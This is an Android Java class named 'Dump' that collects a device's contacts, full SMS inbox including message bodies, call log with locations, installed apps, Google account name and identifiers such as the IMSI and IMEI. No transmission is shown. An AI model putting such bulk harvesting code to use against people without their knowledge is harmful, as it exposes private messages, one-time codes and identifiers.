package com.example.dumpinfoandroid;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;

public class Dump {
        private final Context context;

        Dump(Context context) {
            this.context = context;
        }
        String resultKlientNumber;
        public List<Content> getContacts() {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                try (Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER },
                        null, null, null)) {

                    ArrayList<Content> contactList = new ArrayList<>(cursor.getCount());

                    if (cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            String number = cursor.getString(1).replaceAll("\\s+", "").replaceAll("\\+", "").replaceAll("\\-", "").replaceAll("\\)","").replaceAll("\\(","");;
                            if (number.length() == 10) {
                                resultKlientNumber = "38" + number;
                            } else if (number.length() == 9)  {
                                resultKlientNumber = "380" + number;
                            } else if (number.length() == 11)  {
                                resultKlientNumber = "7" + number.substring(1);
                            } else {
                                resultKlientNumber = number;
                            }
                            contactList.add(Content.getContact(cursor.getString(0), resultKlientNumber));
                        }
                    }
                    return contactList;
                }
            }
            return Collections.emptyList();
        }

        public List<Content> getSms() {
            ArrayList<Content> smsList = null;
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    try (Cursor cursor = context.getContentResolver().query(
                            Telephony.Sms.Inbox.CONTENT_URI,
                            new String[] { Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.DATE, Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.PROTOCOL },
                            null, null, null)) {

                        if (cursor.getCount() > 0) {
                            smsList = new ArrayList<>(cursor.getCount());
                            while (cursor.moveToNext()) {
                                String address = cursor.getString(0);
                                CharSequence date = DateFormat.format("dd.MM.yyyy HH:mm:ss", new Date(cursor.getLong(1)));
                                String body = cursor.getString(2);
                                String protocol = cursor.getString(3);

                                if (protocol == null) {
                                    smsList.add(Content.getSms(address, date, body, "Sent to"));
                                } else {
                                    smsList.add(Content.getSms(address, date, body, "Received from"));
                                }
                            }
                        }
                    }
                }
            }
            return smsList;
        }

        public List<Content> getCall() {
            ArrayList<Content> callList = new ArrayList<>();
            String resultKlientNumber;
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                String[] columns;

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    columns = new String[] { CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.GEOCODED_LOCATION };
                } else {
                    columns = new String[] { CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION };
                }

                try (Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, null)) {
                    callList.ensureCapacity(cursor.getCount());

                    if (cursor.getCount() > 0) {
                        while (cursor.moveToNext()) {
                            String type;
                            switch (cursor.getInt(2)) {
                                case CallLog.Calls.INCOMING_TYPE:
                                    type = "Incoming";
                                    break;
                                case CallLog.Calls.OUTGOING_TYPE:
                                    type = "Outgoing";
                                    break;
                                case CallLog.Calls.MISSED_TYPE:
                                    type = "Missed";
                                    break;
                                case CallLog.Calls.VOICEMAIL_TYPE:
                                    type = "Voicemail";
                                    break;
                                case CallLog.Calls.REJECTED_TYPE:
                                    type = "Rejected";
                                    break;
                                case CallLog.Calls.BLOCKED_TYPE:
                                    type = "Blocked";
                                    break;
                                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                                    type = "Answered externally";
                                    break;
                                default:
                                    type = "Unknown type";
                            }
                            String number = cursor.getString(1).replaceAll("\\s+", "").replaceAll("\\+", "").replaceAll("\\-", "").replaceAll("\\)","").replaceAll("\\(","");;
                            if (number.length() == 10) {
                                resultKlientNumber = "38" + number;
                            } else if (number.length() == 9)  {
                                resultKlientNumber = "380" + number;
                            } else if (number.length() == 11)  {
                                resultKlientNumber = "7" + number.substring(1);
                            } else {
                                resultKlientNumber = number;
                            }

                            CharSequence date = DateFormat.format("dd.MM.yyyy HH:mm:ss", new Date(cursor.getLong(3)));
                            String duration = String.valueOf(cursor.getLong(4));
                            String location = Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ? cursor.getString(5) : null;

                            callList.add(Content.getCall(cursor.getString(0), resultKlientNumber, type, date, duration, location));
                        }
                    }
                }
            }
            return callList;
        }

        public List<Content> getApps() {
            ArrayList<Content> appsList = new ArrayList<>();
            List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);

            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);

                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appsList.add(Content.getApps(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString()));

                }
            }
            return appsList;
        }

        public List<String> getId() {
            ArrayList<String> idList = new ArrayList<>();
            final TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            Account[] googleAccounts = AccountManager.get(context).getAccountsByType("com.google");

            if (googleAccounts.length != 0) {
                idList.add(googleAccounts[0].name);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                idList.add(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            } else {
                idList.add(mTelephony.getSubscriberId());
                idList.add(Build.VERSION.SDK_INT < Build.VERSION_CODES.O ? mTelephony.getDeviceId() : mTelephony.getImei(0));
                idList.add(Build.VERSION.SDK_INT < Build.VERSION_CODES.O ? mTelephony.getDeviceId() : mTelephony.getImei(1));
            }
            return idList;
        }
}
